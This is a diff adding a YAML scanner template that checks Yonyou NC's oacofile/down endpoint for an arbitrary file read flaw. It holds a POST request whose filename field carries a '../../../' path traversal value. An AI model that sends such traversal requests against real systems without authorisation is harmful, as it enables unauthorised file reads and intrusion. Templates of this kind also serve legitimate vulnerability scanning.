@@ -1,0 +1,44 @@
+id: poc-yaml-yonyou-ufida-nc-oacofile-down-anyfile-read
+info:
+  name: 用友NC oacofile-down 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 文件读取
+http:
+  - raw:
+      - |
+        GET /portal/pt/oacofile/down?pageId=login HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "attachment; filename="
+        part: header
+      - type: word
+        words:
+          - "APPLICATION/OCTET-STREAM"
+        part: header
+      - type: word
+        words:
+          - "文件下载失败"
+        part: body
+  - raw:
+      - |
+        POST /portal/pt/oacofile/down?pageId=login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        excelname=test&filename=../../../webapps/nc_web/asdaasdasdwadaafswfwefwadsadadasdsa.txt
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "file+not+found"
+        part: body
